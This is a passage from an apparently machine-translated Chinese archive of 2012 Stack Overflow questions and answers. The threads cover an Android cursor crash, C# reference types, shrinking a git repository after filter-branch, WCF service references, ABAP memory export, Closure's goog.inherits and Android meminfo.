08-17 09:33:38.449: E/AndroidRuntime(14389):    at dalvik.system.NativeStart.main(Native Method)
08-17 09:33:38.449: E/AndroidRuntime(14389): Caused by: android.database.StaleDataException: Attempted to access a cursor after it has been closed.
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.database.BulkCursorToCursorAdaptor.throwIfCursorIsClosed(BulkCursorToCursorAdaptor.java:75)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.database.BulkCursorToCursorAdaptor.requery(BulkCursorToCursorAdaptor.java:144)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.database.CursorWrapper.requery(CursorWrapper.java:186)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.Activity.performRestart(Activity.java:4505)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.Activity.performResume(Activity.java:4531)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2557)
08-17 09:33:38.449: E/AndroidRuntime(14389):    ... 10 more 
```

有没有办法获得未显示的“另外 10 个”？

```
public class EvidenceList extends StandardMenuActivity implements AdapterView.OnItemClickListener {

    private ApplicationSettings settings;
    private Context mContext;
    private Cursor mCursor;
    private Uri mData;

    private ImageButton mActiveButton = null;
    private static final String TAG = EvidenceList.class.getSimpleName();
    protected static final int ACTION_LOGIN = 10;
    protected static final int ACTION_ENTER_PIN = 11;
    protected static final int ACTION_BULK_EDIT = 12;

    private static final int DIALOG_CONFIRM_DELETE = 2;
    private static final int DIALOG_LOADING = 3;
    private static final int DIALOG_FILES_MISSING = 4;

    private static final int MENU_ITEM_CANCEL_UPLOAD = 10001;
    private static final int MENU_ITEM_DELETE_EVIDENCE = 10002;
    private static final int MENU_ITEM_VIEW_EDIT_EVIDENCE = 10003;
    private EvidenceDBHelper evidenceHelper;
    protected UploadQueueHelper upHelper;
    private ListView mListView;
    EvidenceListCursorAdapter mAdapter;    
    private ImageButton mListAllButton, mListAudioButton, mListVideoButton, mListPhotoButton, mListUploadedButton;
    private Button uploadButton;
    private View actionButtonBar, tabButtonBar;    
    private TextView mTitleView;

    private Button mSelectAllButton, mImportButton;
    private EvidenceManager mEvidenceManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        mContext = getApplicationContext();
        settings = ApplicationSettings.getInstance(mContext);

        mEvidenceManager = EvidenceManager.getInstance(mContext);
        setContentView(R.layout.evidence_list);

        actionButtonBar = findViewById(R.id.EvidenceSelectedItemsActionButtonBar);
        tabButtonBar = findViewById(R.id.EvidenceListTabBar);

        mData = getIntent().getData();
        if (mData == null) {
            mData = LocalEvidence.CONTENT_URI;//default data
        }
        upHelper = new UploadQueueHelper(mContext);
        evidenceHelper = new EvidenceDBHelper(mContext);

        mListAllButton = (ImageButton) findViewById(R.id.EvidenceListAllTabButton);
        mListVideoButton = (ImageButton) findViewById(R.id.EvidenceListVideoTabButton);
        mListAudioButton = (ImageButton) findViewById(R.id.EvidenceListAudioTabButton);
        mListPhotoButton = (ImageButton) findViewById(R.id.EvidenceListPhotoTabButton);
        mListUploadedButton = (ImageButton) findViewById(R.id.EvidenceListUploadTabButton);
        mTitleView = (TextView) findViewById(R.id.EvidenceListTypeTitle);
        mSelectAllButton = (Button) findViewById(R.id.CheckAll);        
        mImportButton = (Button) findViewById(R.id.ImportEvidence);
        mImportButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showDialog(DIALOG_IMPORT_EVIDENCE);
            }
        });
        mSelectAllButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {   
                EasyTracker.getTracker().trackEvent(TAG, "select_all", "on", 1);
                Toast.makeText(mContext,  getString(R.string.message_select_all), Toast.LENGTH_SHORT).show();
                mAdapter.checkAll();
            }           
        });

        ListHasCheckedItemsListener checkedItemsListener = new ListHasCheckedItemsListener() {

            @Override
            public void onListCheckedStatusChange(boolean hasCheckedItems) {
                showTabsOrButtons(hasCheckedItems);

            }
        };
        mListView = (ListView) findViewById(android.R.id.list);
        mListView.setEmptyView(findViewById(android.R.id.empty));
        mCursor = getCursor();
        mAdapter = new EvidenceListCursorAdapter(this, mCursor, getUriForCursor(), checkedItemsListener);
        Log.d(TAG, "onCreate, cursor: " + mCursor + " with adapter@uri " + getUriForCursor());
        uploadButton = (Button) findViewById(R.id.UploadEvidenceButton);

        mListView.setAdapter(mAdapter);
        mListView.setOnItemClickListener(this);
        setActiveButton();
        checkIfIntentHasTab(getIntent());

        UploadManagerService.startUploader(this, UploaderAction.OP_START, 1, null);
    }

    @Override
    public void onNewIntent(Intent intent) {
        checkIfIntentHasTab(intent);
    }

    private void checkIfIntentHasTab(Intent intent) {
        String tab = getIntent().getStringExtra("tab");
        if (tab != null) {
            if (tab.equals("uploads_completed")) {
                changeView(R.id.EvidenceListUploadTabButton);
            } else if (tab.equals("all_evidence")) {
                changeView(R.id.EvidenceListAllTabButton);
            } else if (tab.equals("videos")) {
                changeView(R.id.EvidenceListVideoTabButton);
            } else if (tab.equals("photos")) {
                changeView(R.id.EvidenceListPhotoTabButton);
            } else if (tab.equals("audio")) {
                changeView(R.id.EvidenceListAllTabButton);
            } else {
                Log.e(TAG, "no match for tab " + tab);
            }
        }
    }

    public void titlebarLogoClicked(View button) {
        Log.d(TAG, "Clicked titlebar");
        launchMainActivity();
    }

    public void launchMainActivity() {
        Intent i = new Intent(this, Home.class);
        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);

    }
    //should be called after switching the cursor
    private void setActiveButton() {
        if (mData.equals(LocalEvidence.CONTENT_URI)){
            mActiveButton = mListAllButton;
        } else if (mData.equals(LocalEvidence.CONTENT_AUDIO_URI)){
            mActiveButton = mListAudioButton;
        } else if (mData.equals(LocalEvidence.CONTENT_VIDEO_URI)) {
            mActiveButton = mListVideoButton;
        } else if (mData.equals(LocalEvidence.CONTENT_PHOTO_URI)) {
            mActiveButton = mListPhotoButton;
        } else if (mData.equals(LocalEvidence.CONTENT_UPLOADED_URI)) {
            mActiveButton = mListUploadedButton;
        }
        mActiveButton.setSelected(true);
        setOthersInactive(); 
    }
    private void setOthersInactive() {
        if (mActiveButton != mListAllButton) {
            mListAllButton.setSelected(false);
        }
        if (mActiveButton != mListVideoButton) {
            mListVideoButton.setSelected(false);
        }
        if (mActiveButton != mListAudioButton) {
            mListAudioButton.setSelected(false);
        }
        if (mActiveButton != mListPhotoButton) {
            mListPhotoButton.setSelected(false);
        }
        if (mActiveButton != mListUploadedButton) {
            mListUploadedButton.setSelected(false);
        }
    }

    private void changeCursor() {
        mAdapter.changeCursor(getCursor());
    }

    private Cursor getCursor() {        
        return managedQuery(mData, null, null, null, null);
    }

    private Uri getUriForCursor() {
        return LocalEvidence.CONTENT_URI;
    }

    @Override
    protected void onDestroy() {
        Log.d(TAG, "onDestroy");
        mAdapter.close();
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "onResume");
        if (!FileUtils.isExternalStorageAvailableAndWritable(mContext)) {
            Util.showAlertMsgNoExternalStorage(this);
            return;
        }
        if (settings.requiresPin() && settings.getLastPinSuccessEntryTime() < System.currentTimeMillis() - (1000 * 60 * 15)) {
            sendToEnterPin();
            return;
        }
        //Set<Long> selections = mAdapter.getSelectedCheckboxMediaIds();
        //setTabsOrButtons(selections);
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        //super.onSaveInstanceState(outState);
        //outState.
    }
    @Override
    public void onItemClick(AdapterView<?> l, View v, int position, long id) {
        Log.d(TAG, "onListItemClick, item clicked with id " + id);
        Intent openEvidenceIntent = getIntentForEvidenceId(id);
        startActivity(openEvidenceIntent);
    }

    private void uncheckAll() {
        mAdapter.uncheckAll();
    }

    @Override
    public void onBackPressed() {
        Log.d(TAG, "onBackPressed");

        if (mAdapter.hasSelectedCheckboxes()) {
            uncheckAll();
        } else {
            Intent i = new Intent(this, Home.class);
            i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);         
            startActivity(i);
            finish();
            //super.onBackPressed();
        }
    }

    @Override
    protected Dialog onCreateDialog(int id) {
        Log.d(TAG, "onCreateDialog");
        switch (id) {
            case DIALOG_CONFIRM_DELETE:
                String msg = getString(R.string.alert_delete_imported);
                return new AlertDialog.Builder(this)
                        .setMessage(msg)
                        .setCancelable(false)
                        .setPositiveButton(getString(R.string.yes_btn),
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int id) {
                                        EvidenceList.this.doRemoveEvidence();
                                    }
                                })
                        .setNegativeButton(R.string.no_btn, new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                dialog.cancel();
                            }
                        }).create();
            case DIALOG_LOADING:
                ProgressDialog pdialog = new ProgressDialog(this);
                pdialog.setMessage(getString(R.string.alert_checking_login));
                return pdialog;
            case DIALOG_FILES_MISSING:
                return new AlertDialog.Builder(this)
                        .setTitle(getString(R.string.alert_files_missing_title))
                        .setMessage(getString(R.string.alert_files_missing))
                        .setNeutralButton(getString(R.string.ok_btn), new OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int arg1id) {
                                dialog.cancel();
                            }
                        }).create();
            default:
                return super.onCreateDialog(id);
        }

    }

    public void removeEvidence(View v) {
        Log.d(TAG, "removeEvidence");
        //Toast.makeText(mContext,  "Going to delete.. ", Toast.LENGTH_LONG).show();
        showDialog(DIALOG_CONFIRM_DELETE);
    }

    public void bulkEditEvidence(View v) {
        Log.d(TAG, "bulkEditEvidence");
        EasyTracker.getTracker().trackEvent(TAG, "bulk_edit", "", 1);
        Set<Long> selections = mAdapter.getSelectedCheckboxMediaIds();
        Iterator<Long> selectionIter = selections.iterator(); 
        // Pass the array of id's checked to the intent service. 
        // We need to convert from Long[] to long[] 
        long[] ids = new long[selections.size()];
        int i = 0;
        while(selectionIter.hasNext()) {            
            long curr = selectionIter.next();
            ids[i++] = curr;
        }
        Intent bulkEditIntent = new Intent(this, BulkEditEvidence.class);
        bulkEditIntent.putExtra(BulkEditEvidence.EXTRA_EVIDENCE_IDS, ids);
        startActivityForResult(bulkEditIntent, ACTION_BULK_EDIT);
    }

    public void doRemoveEvidence() {
        Log.d(TAG, "doRemoveEvidence");
        EasyTracker.getTracker().trackEvent(TAG, "delete", "", 1);
        Set<Long> selectedIds = mAdapter.getSelectedCheckboxMediaIds();
        if (selectedIds == null || selectedIds.size() < 1) {
            Toast.makeText(mContext,  getString(R.string.alert_no_evidence_removed), Toast.LENGTH_LONG).show();
            return;
        }
        Iterator<Long> selectedIter = selectedIds.iterator();   
        List<Long> deleted = new ArrayList<Long>();
        while(selectedIter.hasNext()) {
            long selectedId = selectedIter.next();
            Log.d(TAG, "going to delete evidence id: " + selectedId);
            Evidence ev = evidenceHelper.getEvidencefromMediaRecord(selectedId);

            if (ev != null) {
                if (ev.getMediaId() > 0) {
                    //has a media id
                    int rowsAffected = evidenceHelper.deleteById(selectedId);
                    upHelper.deleteById(selectedId);
                    if (rowsAffected >0) {
                        deleted.add(selectedId);                         
                    }
                } else {
                    if (ev != null) {
                        try {
                            ev.getFile().delete();
                            int rowsAffected = evidenceHelper.deleteById(selectedId);
                            upHelper.deleteById(selectedId);
                            if (rowsAffected > 0) {
                                deleted.add(selectedId);
                            }
                        } catch(Exception e) {
                            Log.e(TAG, "error trying to delete evidence  " + selectedId + " msg: " + e.getMessage(), e);
                        }
                    }
                }
            } else {
                String msg = String.format(getString(R.string.alert_ev_with_id_could_not_delete), "" + selectedId);
                Toast.makeText(mContext, msg, Toast.LENGTH_LONG).show();
            }
        }
        if (deleted != null && deleted.size() > 0) {
            Long[] deletedArr = deleted.toArray(new Long[1]);
            mAdapter.uncheckIds(deletedArr);
        }
        try {
            dismissDialog(DIALOG_CONFIRM_DELETE);
        } catch(Exception e) {
            //who cares
        }
    }
    public void uploadSelected(View v) throws URISyntaxException, IOException {     
        Log.d(TAG, "uploadSelected");
        uploadButton.setEnabled(false);
        showDialog(DIALOG_LOADING);
        //if the last time the session was checked was more than 15 minutes (-5 seconds)
        //then check the session again..

        if (!settings.canUserAutoLogin()) {
            dismissDialog(DIALOG_LOADING);
            sendToLogin();
        } else {
            doUploadSelected();
            uploadButton.setEnabled(true);
        }

    }

    private void sendToLogin() {
         Intent i = new Intent(Action.LOGIN);         
         startActivityForResult(i, ACTION_LOGIN);
    }

    private void sendToEnterPin() {
        startActivityForResult(new Intent(this, EnterPin.class), ACTION_ENTER_PIN);
    }

    private void doUploadSelected() {
        Log.d(TAG, "doUploadSelected");

        Set<Long> selections = mAdapter.getSelectedCheckboxMediaIds();
        Iterator<Long> selectionIter = selections.iterator(); 
        // Pass the array of id's checked to the intent service. 
        // We need to convert from Long[] to long[] 

        Long[] origArr = selections.toArray(new Long[selections.size()]);
        Log.d(TAG, "about to pass evidence IDs for upload | on thread " + Thread.currentThread().getId());
        List<Long> toUpload = new ArrayList<Long>(); 
        long[] ev_ids = new long[selections.size()];
        int i = 0;
        boolean alertMissing = false;
        while(selectionIter.hasNext()) {
            long curr = selectionIter.next();
            Evidence ev = evidenceHelper.getEvidencefromMediaRecord(curr);
            if (FileUtils.isFileAvailableAndReadable(ev.getFile())) {
                toUpload.add(curr);
                ev_ids[i] = curr;
                i++;
            } else {
                alertMissing = true;
            }
        }
        try {
            dismissDialog(DIALOG_LOADING);
        } catch(Exception e) {}

        if (alertMissing) {
            showDialog(DIALOG_FILES_MISSING);
        }
        if (ev_ids.length < 1) {
            return;
        }
        EasyTracker.getTracker().trackEvent(TAG, "upload_selected", "" + ev_ids.length + " items" , 1);
        UploadManagerService.startUploader(this, UploaderAction.OP_QUEUE_UPLOAD, 1, ev_ids);

        uploadButton.setEnabled(true);
        mAdapter.markIdsAsDisabled(origArr);

    }

    private void onLoginResult(int resultCode, Intent data) {
        EasyTracker.getTracker().trackEvent(TAG, "login", "on", (resultCode == RESULT_OK) ? 1 : 0);
        if (resultCode == RESULT_OK) {

            doUploadSelected();         
        } else {
            try {
                dismissDialog(DIALOG_LOADING);
            } catch (Exception e) {}
            uploadButton.setEnabled(true);
            Toast.makeText(mContext, getString(R.string.alert_cannot_upload_without_internet),  Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {                
        Log.d(TAG, "onActivityResult");

        switch (requestCode) {
            case ACTION_LOGIN:
                onLoginResult(resultCode, data);
                return;
            case ACTION_ENTER_PIN:
                if (resultCode != Activity.RESULT_OK) {                
                     finish();//throw error message
                 }
                return;
            case ACTION_BULK_EDIT:
                if (resultCode == RESULT_OK) {
                    uncheckAll();
                }
                return;
            case ACTION_IMPORT_AUDIO:
            case ACTION_IMPORT_VIDEO:
            case ACTION_IMPORT_PHOTO:
                onImportResult(requestCode, resultCode, data);
                return;                
            default:
                super.onActivityResult(requestCode, resultCode, data);
        }
    }

    private void onImportResult(int requestCode, int resultCode, Intent intent) {

        ImportAction action = ImportAction.IMPORT_PHOTO;
        if (requestCode == ACTION_IMPORT_AUDIO) {
            action = ImportAction.IMPORT_AUDIO;
        } else if (requestCode == ACTION_IMPORT_VIDEO) {
            action = ImportAction.IMPORT_VIDEO;
        }
        EasyTracker.getTracker().trackEvent(TAG, "import", action.toString(), resultCode == RESULT_OK ? 1 : 0);
        if (resultCode == RESULT_OK) {
            Evidence ev = mEvidenceManager.importEvidence(this, intent, action);
            if (ev != null) {
                launchEvidenceListActivity(null);
                BackupService.start(this, BackupService.OP_DATA_CHANGED);
            }
        }
    }

    public void showTabsOrButtons(boolean hasCheckedItems) {        
        if (hasCheckedItems) {
            tabButtonBar.setVisibility(View.INVISIBLE);
            actionButtonBar.setVisibility(View.VISIBLE); 
            if (mData.equals(LocalEvidence.CONTENT_UPLOADED_URI)) {
                actionButtonBar.findViewById(R.id.UploadEvidenceButton).setVisibility(View.GONE);
                actionButtonBar.findViewById(R.id.BulkEditEvidenceButton).setVisibility(View.GONE);
            } else {
                actionButtonBar.findViewById(R.id.UploadEvidenceButton).setVisibility(View.VISIBLE);
            }
        } else {
            actionButtonBar.setVisibility(View.GONE);
            tabButtonBar.setVisibility(View.VISIBLE);
        }
    }

    public void changeView(int id) {
        Uri newUri = null;
        String newTitle = "";
        if (id == R.id.EvidenceListAllTabButton) {
            newUri = LocalEvidence.CONTENT_URI;
            newTitle = getString(R.string.tab_all_pending_upload);
            EasyTracker.getTracker().trackEvent(TAG, "switched_tab", "all", 1);
        } else if (id == R.id.EvidenceListAudioTabButton) {
            newUri = LocalEvidence.CONTENT_AUDIO_URI;
            newTitle = getString(R.string.tab_audio_pending_upload);
            EasyTracker.getTracker().trackEvent(TAG, "switched_tab", "audio", 1);
        } else if (id == R.id.EvidenceListPhotoTabButton) {
            newUri = LocalEvidence.CONTENT_PHOTO_URI;
            newTitle = getString(R.string.tab_photos_pending_upload);
            EasyTracker.getTracker().trackEvent(TAG, "switched_tab", "photos", 1);
        } else if (id == R.id.EvidenceListVideoTabButton) {
            newUri = LocalEvidence.CONTENT_VIDEO_URI;
            newTitle = getString(R.string.tab_video_pending_upload);
            EasyTracker.getTracker().trackEvent(TAG, "switched_tab", "videos", 1);
        } else if (id == R.id.EvidenceListUploadTabButton) {
            newUri = LocalEvidence.CONTENT_UPLOADED_URI;
            newTitle = getString(R.string.tab_all_uploaded);
            EasyTracker.getTracker().trackEvent(TAG, "switched_tab", "uploaded", 1);
        }

        //only change something if its a different view
        if (!mData.equals(newUri) && newUri != null) {
            mData = newUri;
            changeCursor();
            setActiveButton();
            mTitleView.setText(newTitle);
        }
    }
    public void changeView(View button) {
        changeView(button.getId());
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:54:07.030

我使用了一个很棒的免费工具，[BugSense](http://www.bugsense.com/)，它很容易插入到您的应用程序中，当发生崩溃时，它会告诉您导致崩溃的行号。它还会通知您有关崩溃的信息，为您提供有关 android 版本、应用程序版本、先前发生次数、设备状态等的信息。

这是我的应用程序崩溃报告中的一个示例： ![在此处输入图像描述](../Images/f60cbb886f7aa465f7ebda04b9b16c70.png)

# c# - 哪些数据类型默认是引用类型？

> ID：12009765
> 
> 赞同：2
> 
> 时间：2012-08-17T16:39:59.180
> 
> 标签：c#

因此，当我测试使用参数创建的方法时`DataRow`，我发送了一个参数并在方法内部对其进行了修改。在那之后，我的原件`DataRow`改变了它最终在该方法之后的任何内容。我意识到这是因为`DataRow`它是一个“参考类型”，这对我来说是新的。

`DataRow`我现在知道在使用方法时我可以在其他数据类型之前使用“ref”或“out”，这样就会产生与示例相同的效果。但我的问题是，默认情况下哪些数据类型是引用类型？当我将另一种数据类型传递给方法并更改原始值时，我不想措手不及。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-17T16:41:44.653

> 但我的问题是，默认情况下哪些数据类型是引用类型？

任何定义为 a 的`class`都是引用类型，以及引用 a`interface`或委托的变量，或声明的变量`dynamic`。有关详细信息，请参阅[参考类型](http://msdn.microsoft.com/en-us/library/490f96s2.aspx)。您可以在方法中更改类的*成员*，而无需通过`ref`or `out`。话虽如此，您不能更改*引用本身*- 因此变量在方法调用之后将始终指向与方法调用之前相同的实例，除非您通过`out`or传递它`ref`。

如果它是 a `struct`，它将是一个值类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:47:25.273

一个更好的问题是哪些类型不是引用类型。

[MSDN 文档](http://msdn.microsoft.com/en-us/library/s1ax56ch.aspx)

*   结构
*   枚举

结构分为以下几类：

*   数值类型：整数类型、浮点类型和小数
*   布尔
*   用户定义的结构

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:42:58.373

`ref`和`out`不*一样*的是引用类型。事实上，它们的含义取决于您使用的类型。

On`value type` `ref`关键字是一个参考，

On`reference type` `ref`关键字是对引用的引用。

在`CLR`默认情况下`classes`are `reference types`， ans`struct`是 a `value type`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:49:07.213

c# 中的所有内容都派生自`Object`.. 这就是为什么您会看到 a`toString()`和其他方法，即使是 int..

**-->Value Types** [占用存储它们所需的内存]

{也称为原始类型（十进制除外），因为它们由处理器直接支持}

> ->int,long,byte,flot,decimal...
> 
> ->布尔
> 
> ->字符

**-->引用类型**[需要为引用和对象单独分配内存]

```
->string

->object 
```

**-->通用类型参数**

> ->T（示例：树示例）

**-->指针类型**

> ->标记为不安全代码

**可以传递参数**

> ->按**值**（在值类型的情况下创建精确副本||仅在引用类型的情况下复制引用）
> 
> ->by **ref**（指同一个对象）
> 
> -> by **out**（允许未初始化的数据作为参数传递 && 与 ref 相同）

**重要事实**

**c# 中的参数是`by default`按值传递的**

# git - Git永久删除文件不会导致更小的回购？

> ID：12009770
> 
> 赞同：2
> 
> 时间：2012-08-17T16:40:18.170
> 
> 标签：git, git-filter-branch

我有一个（开始时）大小为 5.6G 的存储库：

```
aparkin@mymachine ~/repo (master)
$ du -d 0 -h
5.6G    . 
```

但是，这个 repo 包含许多不再需要在 repo 中的大型二进制文件。最初它们位于目录结构中的不同位置，但都命名为“tc.dat”。作为“清理”步骤，我创建了一个`cruft`目录，并将`git mv`它们全部放入这个杂乱无章的目录中，将它们的名称更改为`tc.dat1`,`tc.dat2`等。

然后我有5个这样的文件，`tc.dat1`通过`tc.dat5`

然后我按照[这个问题](https://stackoverflow.com/questions/872565/remove-sensitive-files-and-their-commits-from-git-history "这个问题")，并`filter-branch`与清理步骤一起使用以删除目录中这些文件的所有实例`cruft`。`cruft`但是，这仍然在 repo 中留下了原始文件名（在移入之前）。然后，我重复了将它们从所有提交中的原始位置删除的步骤，并再次执行了清理步骤：

```
rm -rf .git/refs/original/ && git reflog expire --all &&  git gc --aggressive --prune 
```

毕竟，如果我做一个

```
git log --all -- tc*.dat 
```

我在我的历史记录中没有看到任何匹配项，这表明它们已被完全删除。但是，当我再次执行时`du`，repo 的大小仍然为 5.6G。鉴于这些文件包含大约 0.5GB，我希望看到这个数字会下降。

我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T18:49:34.430

好的，我缺少一些东西。

按照[Git pull 错误的提示：无法创建临时 sha1 文件名](https://stackoverflow.com/questions/685319/git-pull-error-unable-to-create-temporary-sha1-filename/685422#685422)，我尝试了一些命令并做了：

```
$ git-prune
$ git-prune-packed
$ du -h -d 0
5.2G 
```

大约下降了 0.4G，这大约是我想要删除的文件的大小。在阅读[其他一些问题](https://stackoverflow.com/questions/3797907/howto-remove-unused-objects-from-a-git-repsitory)和手册页时，我还注意到我对`git-reflog`and`git-gc`的使用`reflog expire`不`--aggressive --prune`正确。两者都接受关于历史可以追溯到多远的参数，并且在这两种情况下，我都想要*所有*历史，因此`now`需要参数：

```
$ rm -rf .git/refs/original/
$ git reflog expire --all --expire=now
$ git gc --aggressive --prune=now
$ du -h -d 0
4.5G    . 
```

与我开始时相比，节省了相当多的费用（1.1G）。

# c# - 服务引用生成不同的类到 Web 引用

> ID：12009771
> 
> 赞同：0
> 
> 时间：2012-08-17T16:40:21.793
> 
> 标签：c#, azure, wsdl

我正在使用这个 wsdl 来生成类。

[https://pal-live.adyen.com/pal/Payment.wsdl](https://pal-live.adyen.com/pal/Payment.wsdl)

当我将它添加为“网络参考”时，它会创建一个 Payment 类，其中包含付款所需的方法。

将其添加为“服务引用”时，它仅创建具有这些方法的接口，但没有 Payment 类。

还有其他类，但缺少关键的 Payment 类，其方法仅在接口中。

wsdl 如何生成不同的类？这里的主要区别是什么，我怎样才能得到这个支付类？

还可能值得注意的是，我无法使用 Web 参考的原因是因为此代码正在部署到 azure 网站，如果我推送 Web 参考生成的代码，我会收到 sdk 版本错误。大概是因为.net版本。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:12:02.857

我使用 svcutil 根据您的 wsdl 生成类。

它创建了界面`PaymentPortType`。这定义了如何与您的服务通信的合同。但是，这并不知道服务位于何处。

它还创建了类`PaymentPortTypeClient`。这个类继承自`ClientBase<PaymentPortType>`. 通过为 PaymentPortTypeClient 提供 Binding 和 EndpointAddress，您现在拥有与服务通信所需的一切。

注意：这可以来自配置文件，此时您将使用构造函数

```
public PaymentPortTypeClient(string endpointConfigurationName) 
```

ClientBase 有一个私有的 ChannelFactory。ChannelFactory.CreateChannel() 将创建一个实现 PaymentPortType 并可以与您的服务对话的对象。这是自动完成的并存储在 ClientBase.Channel 中。

最后，`PaymentPortTypeClient`还实现了 PaymentPortType。接口中的每个方法都实现为在通道上调用该方法。

# memory - 从 ABAP 内存导入通用表？

> ID：12009773
> 
> 赞同：2
> 
> 时间：2012-08-17T16:40:28.777
> 
> 标签：memory, abap, rtts

我正在将动态创建的内部表导出到内存。

我想知道是否有可能以某种方式（从另一个程序）取回它，此外，虽然第一个程序至少知道我从中动态创建 itab 的表的名称，但第二个程序不知道.

这是导出我的 itab 的代码（有效 :P ）。

```
parameters: pi_tbl(5) type c obligatory.    "The table name - input from the user. can be jibberish.

data: gr_tabref type ref to data.
field-symbols:<gfs_tab> type any table. 

form create_dynamic_gr_tabref .
  data: lo_struct type ref to cl_abap_structdescr,
        lo_tabref type ref to cl_abap_tabledescr.
  lo_struct ?= cl_abap_typedescr=>describe_by_name( pi_tbl ).
  try.
      call method cl_abap_tabledescr=>create
        exporting
          p_line_type  = lo_struct
        receiving
          p_result     = lo_tabref
          .
    catch cx_sy_table_creation .
      message 'Couldn''t create the table description. Quitting' type 'E'.
  endtry.
  create data gr_tabref type handle lo_tabref.

  assign gr_tabref->* to <gfs_tab>.

  select * from (pi_tbl) into table <gfs_tab> up to 200 rows.
  data: lv_memory_id(30) type c.
  lv_memory_id = 'MYMEMORYID'.

  export itab from <gfs_tab> to memory id lv_memory_id.

endform. 
```

我可以只使用带有表名的参数来取回数据吗？

我想要的是声明一个通用数据类型，并将数据放入其中，例如：

```
Object myObject; import itab to myObject memory id 'MYMEMORYID'. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-09T11:18:36.427

在第一个程序中替换

```
export itab from <gfs_tab> to memory id lv_memory_id. 
```

和

```
cl_salv_bs_runtime_info=>set(
  EXPORTING
    display        = space
    metadata       = space
    data           = 'X'
).

cl_salv_bs_runtime_info=>set_data(
  EXPORTING
    data      = <gfs_tab>
). 
```

在第二个程序中这样做：

```
data lpt_data type ref to data.
cl_salv_bs_runtime_info=>get_data_ref(
    IMPORTING
        r_data            = lpt_data
). 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T07:29:39.700

对于表格：是的，可以这样做，但不应该这样做。一个原因是除非您非常小心地释放内存，否则用户会话将不得不携带数据，另一个原因是这是一种隐藏的全局（如跨程序）变量，这通常是一个坏主意将其引入新程序。如果您对调用者和被调用程序、功能模块或类都有控制权，则有更好的方法来传输数据。仅当您必须/想要使用一些您无法更改以提供更好界面的其他程序时才使用此选项 - 或者在某些特殊情况下，例如`SUBMIT ... EXPORTING LIST TO MEMORY`. 这是 ABAP 的“遗留气味”部分之一，它现在很好，但在大多数情况下你可以不用它。

# google-closure - 扩展 goog.Disposable 生成 jsDoc 错误

> ID：12009774
> 
> 赞同：0
> 
> 时间：2012-08-17T16:40:33.273
> 
> 标签：google-closure, google-closure-library, jsdoc

我的一个类生成了一个 jsDoc 错误，因为它正在扩展 goog.Disposable。我正在使用@extends 来指定这一点，但它仍然无法正常工作。使用闭包 linter 编译文件时不会出错。代码可以在这里找到”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:00:06.397

您的 JavaScript 文件包含以下行：

```
goog.inherits(goog.Disposable, niuzly.base.errorHandler); 
```

***[goog.inherits](http://code.google.com/p/closure-library/source/browse/trunk/closure/goog/base.js#1374)***接受子构造函数，后跟父构造函数：

```
goog.inherits(niuzly.base.errorHandler, goog.Disposable); 
```

对于[JSDoc-Toolkit](http://code.google.com/p/jsdoc-toolkit)模板，您可以尝试[gcodewiki](http://code.google.com/p/gcodewiki/)。使用 gcodewiki，我成功为您的文件*niuzly.base.errorHandler.js*生成了 JSDoc，并带有以下警告：

```
>> WARNING: Trying to document errorHandler as a member of undocumented symbol niuzly.base.
>> WARNING: Can't augment contributer: goog.Disposable, not found. 
```

包括闭包库`base.js`和`disposable.js`作为 JSDoc-Toolkit 的输入消除了警告`Can't augment contributer: goog.Disposable, not found.`

要消除有关 undocumented symbol 的警告`niuzly.base`，您可以将以下内容添加到源文件中，或者忽略警告。

```
/**
 * @type {Object} Namespace for Niuzly Inc.
 */
var niuzly = niuzly || {};

/**
 * @type {Object} Base namespace.
 */
niuzly.base = niuzly.base || {}; 
```

# [JSDoc 3](https://github.com/jsdoc3/jsdoc)

*当仅指定niuzly.base.errorHandler.js*和*disposable.js*时，使用[JSDoc 3](https://github.com/jsdoc3/jsdoc)而不是旧的 JSDoc-Toolkit 成功生成了文档。此外，没有关于未记录符号的警告。**`niuzly.base`**

# android - 定制的 android dumpsys meminfo

> ID：12009775
> 
> 赞同：2
> 
> 时间：2012-08-17T16:41:05.080
> 
> 标签：android, logging, memory-management, sampling

如何编写自己的代码来使用“meminfo”系统服务？或者如何添加自己的系统服务？我的目标是在应用程序运行时自动采样内存使用数据，并在事后分析数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:54:23.717

> 如何编写自己的代码来使用“meminfo”系统服务？

本身没有“meminfo”系统服务。要访问生成所有“meminfo”输出的代码，您需要编写包含您的代码（以及根据需要对 Android 进行修改）的定制版本的 Android 操作系统。

